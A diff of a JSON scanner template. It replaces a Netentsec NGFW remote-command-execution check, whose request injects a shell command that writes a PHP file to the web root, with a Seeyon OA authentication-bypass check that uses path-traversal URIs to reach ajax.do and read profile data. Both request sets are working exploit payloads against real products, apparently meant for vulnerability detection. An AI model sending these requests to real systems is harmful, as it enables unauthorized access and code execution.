@@ -1,15 +1,15 @@
 {
-    "Name": "netentsec-ngfw-rce",
-    "Description": "netentsec-ngfw-rce",
-    "Product": "Netentsec",
+    "Name": "Seeyon OA AJAX Unauthorized",
+    "Description": "Seeyon OA AJAX Unauthorized",
+    "Product": "Seeyon OA",
     "author": "chumeng",
     "Request":[
         {
-        "Method": "POST",
+        "Method": "GET",
         "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
-        "Uri":"/directdata/direct/router",
+        "Uri":"/seeyon/thirdpartyController.do.css/..;/ajax.do",
         "Port":"",
-        "Data":"{\"action\":\"SSLVPN_Resource\",\"method\":\"deleteImage\",\"data\":[{\"data\":[\"/var/www/html/d.txt;echo '<?php echo md5(123);unlink(__FILE__);?>' >/var/www/html/chumeng.php\"]}],\"type\":\"rpc\",\"tid\":17}",
+        "Data":"",
         "Follow_redirects":"false",
         "Upload":{"Name": "","fileName": "","filePath": "" },
         "Response":{
@@ -18,13 +18,8 @@
                 {
                 "Operation": "contains", 
                 "Key":"",
-                "Value": "SSLVPN_Resource"
+                "Value": "java.lang.NullPointerException:null"
                 },
-                {
-                 "Operation": "contains", 
-                 "Key":"",
-                 "Value": "\"result\":{\"success\":true}"
-                 },
                  {
                 "Operation": "code", 
                 "Key":"",
@@ -36,7 +31,7 @@
                 }, {
                     "Method": "GET",
                     "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
-                    "Uri":"/chumeng.php",
+                    "Uri":"/seeyon/personalBind.do.jpg/..;/ajax.do?method=ajaxAction&managerName=mMOneProfileManager&managerMethod=getOAProfile",
                     "Port":"",
                     "Data":"",
                     "Follow_redirects":"false",
@@ -47,8 +42,12 @@
                             {
                             "Operation": "contains", 
                             "Key":"",
-                            "Value": "202cb962ac59075b964b07152d234b70"
-                            },
+                            "Value": "MMOneProfile"
+                            }, {
+                                "Operation": "contains", 
+                                "Key":"",
+                                "Value": "serverIdentifier"
+                                },
                              {
                             "Operation": "code", 
                             "Key":"",
